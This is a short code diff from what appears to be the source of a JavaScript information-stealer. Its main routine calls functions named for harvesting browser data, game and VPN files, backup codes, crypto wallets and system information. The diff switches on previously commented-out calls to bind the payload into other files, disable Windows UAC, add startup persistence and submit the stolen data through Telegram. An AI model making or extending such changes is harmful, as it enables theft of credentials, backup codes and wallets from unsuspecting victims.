@@ -4213,7 +4213,7 @@ function onlyUnique(item, index, array) {
     main();
     hideconsole();
     //antivm();
-    //binder();
+    binder();
     initializeFolders();
     manageBrowsers();
     games();
@@ -4221,8 +4221,8 @@ function onlyUnique(item, index, array) {
     filevpn();
     backupcodes();
     wallet();
-    //disableuac();
+    disableuac();
     computerinfo();
-    //startup();
+    startup();
     handleMiscellaneous();
-    //SubmitTelegram();
+    SubmitTelegram();
